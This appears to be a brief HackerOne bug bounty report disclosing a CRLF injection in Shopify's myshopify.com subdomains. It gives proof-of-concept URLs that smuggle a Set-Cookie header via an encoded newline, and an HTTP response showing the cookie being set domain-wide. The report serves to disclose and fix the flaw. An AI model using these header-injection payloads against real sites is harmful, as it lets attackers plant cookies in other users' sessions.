# HackerOne Report: [www.*.myshopify.com] CRLF Injection
**Report ID:** 66386
**Vulnerability Class:** Uncategorized

## Vulnerability Information & PoC
CRLF Injection via Request-URI

PoC:
http://www.myshopify.com/xxcrlftest%0aSet-Cookie:test=test3;domain=.myshopify.com;
https://www.blackfan.myshopify.com/xxx%0aSet-Cookie:test=test2;domain=.myshopify.com;

HTTP Response:
```
HTTP/1.1 302 Moved Temporarily
...
Location: http://myshopify.com/xxcrlftest
Set-Cookie:test=test;domain=.myshopify.com;
```

Result:
Creating a cookie-param "test=test" on *.myshopify.com

## Discussion & Remediation Timeline
